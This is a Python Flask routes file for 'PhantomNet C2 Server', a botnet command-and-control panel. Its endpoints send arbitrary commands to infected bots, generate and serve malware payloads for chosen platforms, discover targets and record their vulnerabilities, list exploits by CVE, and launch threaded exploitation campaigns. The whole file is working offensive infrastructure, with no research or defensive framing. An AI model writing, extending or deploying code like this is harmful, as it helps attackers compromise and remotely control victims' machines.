"""
API routes for PhantomNet C2 Server
"""

import json
import secrets
import tempfile
import threading
import os
from flask import Blueprint, request, jsonify, send_file, session
from werkzeug.security import check_password_hash

from ..models import (
    db, Admin, Bot, Command, Payload, Target, Campaign, Exploit, Task
)
from ..server import PhantomC2Server

api_bp = Blueprint('api', __name__)

# Global server instance (would be injected in production)
server = PhantomC2Server()

@api_bp.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Cloud Run"""
    return jsonify({
        'status': 'healthy',
        'service': 'phantomnet-c2',
        'version': '1.0.0'
    }), 200

@api_bp.route('/admin/commands', methods=['POST'])
def send_command():
    """Send command to bot"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'command' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Generate command ID
    command_id = secrets.token_urlsafe(16)

    # Create command
    command = Command(
        id=command_id,
        bot_id=data['bot_id'],
        command=data['command'],
        args=json.dumps(data.get('args', {}))
    )

    db.session.add(command)
    db.session.commit()

    return jsonify({
        'command_id': command_id,
        'status': 'pending'
    })

@api_bp.route('/admin/payloads', methods=['POST'])
def create_payload():
    """Create new payload"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    if not data or 'name' not in data or 'platform' not in data or 'architecture' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Generate payload
    payload_data = server.payload_generator.generate_payload(
        data['platform'],
        data['architecture'],
        data.get('payload_type', 'exe')
    )

    if not payload_data:
        return jsonify({'error': 'Failed to generate payload'}), 500

    # Create payload record
    payload = Payload(
        name=data['name'],
        payload_type=payload_data['type'],
        platform=payload_data['platform'],
        architecture=payload_data['architecture'],
        payload_data=payload_data['data'],
        encryption_key=secrets.token_urlsafe(32)
    )

    db.session.add(payload)
    db.session.commit()

    return jsonify({
        'payload_id': payload.id,
        'download_url': f"/admin/payloads/{payload.id}/download"
    })

@api_bp.route('/admin/payloads/<int:payload_id>/download')
def download_payload(payload_id):
    """Download generated payload"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    payload = Payload.query.get(payload_id)
    if not payload:
        return jsonify({'error': 'Payload not found'}), 404

    # Create temporary file
    temp_dir = tempfile.gettempdir()
    filename = f"{payload.name}.{payload.payload_type}"
    filepath = os.path.join(temp_dir, filename)

    # Write payload data to file
    with open(filepath, 'wb') as f:
        f.write(payload.payload_data)

    # Send file to user
    return send_file(
        filepath,
        as_attachment=True,
        download_name=filename,
        mimetype='application/octet-stream'
    )

@api_bp.route('/admin/targets/discover', methods=['POST'])
def discover_targets():
    """Discover targets using configured methods"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400

    # Discover targets
    targets = server.target_discovery.discover_targets(data)

    # Save targets to database
    for target in targets:
        existing = Target.query.filter_by(ip_address=target['ip']).first()
        if not existing:
            new_target = Target(
                ip_address=target['ip'],
                hostname=target.get('hostname', ''),
                os_info=target.get('os_info', 'Unknown'),
                open_ports=json.dumps(target.get('open_ports', [])),
                vulnerabilities=json.dumps(target.get('vulnerabilities', [])),
                services=json.dumps(target.get('services', []))
            )
            db.session.add(new_target)

    db.session.commit()

    return jsonify({
        'targets_found': len(targets),
        'targets': targets
    })

@api_bp.route('/admin/campaigns', methods=['POST'])
def create_campaign():
    """Create new campaign"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    if not data or 'name' not in data or 'payload_id' not in data or 'target_criteria' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Create campaign
    campaign = Campaign(
        name=data['name'],
        description=data.get('description', ''),
        payload_id=data['payload_id'],
        target_criteria=json.dumps(data['target_criteria'])
    )

    db.session.add(campaign)
    db.session.commit()

    # Start campaign execution
    server.active_campaigns[campaign.id] = {
        'campaign': campaign,
        'status': 'running',
        'targets_processed': 0,
        'targets_exploited': 0
    }

    # Start campaign thread
    threading.Thread(target=server.execute_campaign, args=(campaign.id,)).start()

    return jsonify({
        'campaign_id': campaign.id,
        'status': 'running'
    })

@api_bp.route('/admin/exploits', methods=['GET'])
def list_exploits():
    """List available exploits"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    exploits = Exploit.query.all()
    return jsonify([{
        'id': exploit.id,
        'name': exploit.name,
        'type': exploit.exploit_type,
        'platform': exploit.target_platform,
        'cve': exploit.cve_id,
        'success_rate': exploit.success_rate
    } for exploit in exploits])

@api_bp.route('/admin/tasks', methods=['GET'])
def list_tasks():
    """List tasks"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    tasks = Task.query.order_by(Task.created_at.desc()).limit(50).all()
    return jsonify([{
        'id': task.id,
        'bot_id': task.bot_id,
        'type': task.task_type,
        'command': task.command,
        'status': task.status,
        'created_at': task.created_at.isoformat(),
        'execution_time': task.execution_time
    } for task in tasks])

@api_bp.route('/admin/bots', methods=['GET'])
def list_bots():
    """List all bots"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    bots = Bot.query.all()
    return jsonify([{
        'id': bot.id,
        'ip': bot.ip_address,
        'hostname': bot.hostname,
        'os': bot.os_info,
        'user': bot.username,
        'registered': bot.registered_at.isoformat(),
        'last_seen': bot.last_seen.isoformat() if bot.last_seen else None,
        'status': bot.status,
        'capabilities': json.loads(bot.capabilities) if bot.capabilities else {}
    } for bot in bots])

@api_bp.route('/admin/bots/<bot_id>/terminate', methods=['POST'])
def terminate_bot(bot_id):
    """Terminate bot"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    bot = Bot.query.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404

    # Create termination command
    command_id = secrets.token_urlsafe(16)
    command = Command(
        id=command_id,
        bot_id=bot_id,
        command='terminate',
        status='pending'
    )

    db.session.add(command)
    db.session.commit()

    return jsonify({'status': 'success', 'command_id': command_id})

@api_bp.route('/admin/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Get basic statistics
    total_bots = Bot.query.count()
    active_bots = Bot.query.filter_by(status='active').count()
    total_targets = Target.query.count()
    total_campaigns = Campaign.query.count()
    total_payloads = Payload.query.count()
    total_tasks = Task.query.count()
    completed_tasks = Task.query.filter_by(status='completed').count()
    failed_tasks = Task.query.filter_by(status='failed').count()

    stats = {
        'total_bots': total_bots,
        'active_bots': active_bots,
        'total_targets': total_targets,
        'total_campaigns': total_campaigns,
        'total_payloads': total_payloads,
        'total_tasks': total_tasks,
        'completed_tasks': completed_tasks,
        'failed_tasks': failed_tasks,
        'success_rate': (completed_tasks / total_tasks * 100) if total_tasks > 0 else 0
    }
    
    return jsonify(stats)

@api_bp.route('/admin/payloads', methods=['GET'])
def list_payloads():
    """List all payloads"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    payloads = Payload.query.all()
    return jsonify([{
        'id': payload.id,
        'name': payload.name,
        'payload_type': payload.payload_type,
        'platform': payload.platform,
        'architecture': payload.architecture,
        'created_at': payload.created_at.isoformat(),
        'is_active': payload.is_active
    } for payload in payloads])

@api_bp.route('/admin/targets', methods=['GET'])
def list_targets():
    """List all targets"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    targets = Target.query.all()
    return jsonify([{
        'id': target.id,
        'ip_address': target.ip_address,
        'hostname': target.hostname,
        'os_info': target.os_info,
        'open_ports': json.loads(target.open_ports) if target.open_ports else [],
        'status': target.status,
        'discovered_at': target.discovered_at.isoformat()
    } for target in targets])

@api_bp.route('/admin/campaigns', methods=['GET'])
def list_campaigns():
    """List all campaigns"""
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    campaigns = Campaign.query.all()
    return jsonify([{
        'id': campaign.id,
        'name': campaign.name,
        'description': campaign.description,
        'status': campaign.status,
        'targets_discovered': campaign.targets_discovered,
        'targets_exploited': campaign.targets_exploited,
        'success_rate': campaign.success_rate,
        'created_at': campaign.created_at.isoformat()
    } for campaign in campaigns])

@api_bp.route('/admin/login', methods=['POST'])
def api_login():
    """API login endpoint for mobile app"""
    data = request.json
    if not data or 'username' not in data or 'password' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    username = data['username']
    password = data['password']

    admin = Admin.query.filter_by(username=username).first()
    if admin and check_password_hash(admin.password_hash, password):
        session['admin_logged_in'] = True
        session['admin_id'] = admin.id
        
        # Generate session token for mobile app
        session_token = secrets.token_urlsafe(32)
        
        return jsonify({
            'success': True,
            'session_token': session_token,
            'admin_id': admin.id,
            'username': admin.username
        })
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@api_bp.route('/admin/logout', methods=['POST'])
def api_logout():
    """API logout endpoint for mobile app"""
    session.pop('admin_logged_in', None)
    session.pop('admin_id', None)
    return jsonify({'success': True, 'message': 'Logged out successfully'})
